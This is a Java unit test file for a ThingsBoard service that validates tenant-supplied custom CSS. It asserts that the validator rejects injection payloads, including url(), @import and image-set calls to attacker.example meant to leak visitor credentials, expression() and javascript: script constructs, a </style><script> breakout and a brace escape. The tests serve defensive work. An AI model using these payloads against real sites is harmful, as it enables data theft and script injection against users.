// SPDX-FileCopyrightText: Copyright The Thingsboard Authors
// SPDX-License-Identifier: Apache-2.0
package org.thingsboard.server.dao.settings;

import org.junit.jupiter.api.Test;
import org.thingsboard.server.common.data.whiteLabeling.WhiteLabelingSettings;
import org.thingsboard.server.dao.exception.IncorrectParameterException;

import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class DefaultWhiteLabelingServiceTest {

    @Test
    void acceptsPlainCss() {
        assertThatCode(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                ".tb-logo { height: 40px; } .tb-title { color: #305680; }")))
                .doesNotThrowAnyException();
    }

    @Test
    void acceptsEmptyCss() {
        assertThatCode(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(null)))
                .doesNotThrowAnyException();
        assertThatCode(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings("   ")))
                .doesNotThrowAnyException();
    }

    @Test
    void rejectsRemoteReferences() {
        // the browser would request the url with the credentials of every visitor of the tenant
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "body { background: url('https://attacker.example/leak'); }")))
                .isInstanceOf(IncorrectParameterException.class);
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "@import url('https://attacker.example/x.css');")))
                .isInstanceOf(IncorrectParameterException.class);
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "body { background: image-set('https://attacker.example/x.png'); }")))
                .isInstanceOf(IncorrectParameterException.class);
    }

    @Test
    void rejectsScriptConstructs() {
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "body { width: expression(alert(1)); }")))
                .isInstanceOf(IncorrectParameterException.class);
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "body { background: javascript:alert(1); }")))
                .isInstanceOf(IncorrectParameterException.class);
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "body { -moz-binding: url(x.xml); }")))
                .isInstanceOf(IncorrectParameterException.class);
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "</style><script>alert(1)</script>")))
                .isInstanceOf(IncorrectParameterException.class);
    }

    @Test
    void rejectsUnbalancedBraces() {
        // an unbalanced brace would let the injected rules escape the scope of the branding stylesheet
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "body { color: red; } } .tb-login { display: none; }")))
                .isInstanceOf(IncorrectParameterException.class);
    }

    @Test
    void rejectsOversizedCss() {
        assertThatThrownBy(() -> DefaultWhiteLabelingService.validateAdvancedCss(settings(
                "a { color: red; }".repeat(5000))))
                .isInstanceOf(IncorrectParameterException.class);
    }

    private static WhiteLabelingSettings settings(String advancedCss) {
        WhiteLabelingSettings settings = new WhiteLabelingSettings();
        settings.setAdvancedCss(advancedCss);
        return settings;
    }

}
